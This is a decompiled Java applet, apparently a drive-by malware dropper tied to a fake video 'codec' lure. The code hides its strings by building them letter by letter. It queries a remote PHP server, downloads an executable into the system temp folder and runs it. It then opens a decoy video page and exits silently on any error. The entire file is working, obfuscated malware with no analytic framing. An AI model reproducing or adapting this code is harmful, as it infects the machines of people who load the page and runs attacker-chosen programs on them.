import java.io.Reader;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.nio.channels.ReadableByteChannel;
import java.io.FileOutputStream;
import java.nio.channels.Channels;
import java.net.MalformedURLException;
import java.net.URL;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class Java extends Applet
{
    @Override
    public void init() {
        try {
            final String[] array = { "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", ":", "/", ".", "=", "&", "-" };
            final String[] split = bz(new StringBuffer().append(array[7]).append(array[19]).append(array[19]).append(array[15]).append(array[26]).append(array[27]).append(array[27]).append(array[5]).append(array[14]).append(array[23]).append(array[23]).append(array[24]).append(array[18]).append(array[14]).append(array[5]).append(array[19]).append(array[22]).append(array[0]).append(array[17]).append(array[4]).append(array[28]).append(array[13]).append(array[4]).append(array[19]).append(array[27]).append(array[6]).append(array[4]).append(array[19]).append(array[28]).append(array[15]).append(array[7]).append(array[15]).toString(), new StringBuffer().append(array[18]).append(array[8]).append(array[19]).append(array[4]).append(array[29]).append(this.getDocumentBase().toString()).append(array[30]).append(array[20]).append(array[18]).append(array[4]).append(array[17]).append(array[13]).append(array[0]).append(array[12]).append(array[4]).append(array[29]).append("adm").append(array[30]).append(array[20]).append(array[17]).append(array[11]).append(array[29]).append(new StringBuffer().append("http://privatetube.onlinetubes24.com/codec").append(array[28]).append(array[4]).append(array[23]).append(array[4]).toString()).toString()).split("-_-");
            if (split[2] != "G") {
                URL url = null;
                final Runtime runtime = Runtime.getRuntime();
                final String property = System.getProperty(new StringBuffer().append(array[9]).append(array[0]).append(array[21]).append(array[0]).append(array[28]).append(array[8]).append(array[14]).append(array[28]).append(array[19]).append(array[12]).append(array[15]).append(array[3]).append(array[8]).append(array[17]).toString());
                try {
                    url = new URL(split[0]);
                }
                catch (MalformedURLException ex) {
                    System.exit(0);
                }
                final ReadableByteChannel channel = Channels.newChannel(url.openStream());
                final FileOutputStream fileOutputStream = new FileOutputStream(property + split[1]);
                fileOutputStream.getChannel().transferFrom(channel, 0L, 1048576L);
                fileOutputStream.close();
                channel.close();
                try {
                    runtime.exec(property + split[1]);
                    this.getAppletContext().showDocument(new URL("http://privatetube.onlinetubes24.com/index2.html"), "_blank");
                    System.exit(0);
                }
                catch (Exception ex2) {
                    System.exit(0);
                }
            }
        }
        catch (Exception ex3) {
            System.exit(0);
        }
    }
    
    public static String bz(final String s, final String s2) {
        String string = null;
        final String[] array = { "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", ":", "/", ".", "=", "&", "-" };
        if (s.startsWith(new StringBuffer().append(array[7]).append(array[19]).append(array[19]).append(array[15]).append(array[26]).append(array[27]).append(array[27]).toString())) {
            try {
                String string2 = s;
                if (s2 != null && s2.length() > 0) {
                    string2 = string2 + "?" + s2;
                }
                final BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(new URL(string2).openConnection().getInputStream()));
                final StringBuffer sb = new StringBuffer();
                String line;
                while ((line = bufferedReader.readLine()) != null) {
                    sb.append(line);
                }
                bufferedReader.close();
                string = sb.toString();
            }
            catch (Exception ex) {
                System.exit(0);
            }
        }
        return string;
    }
}
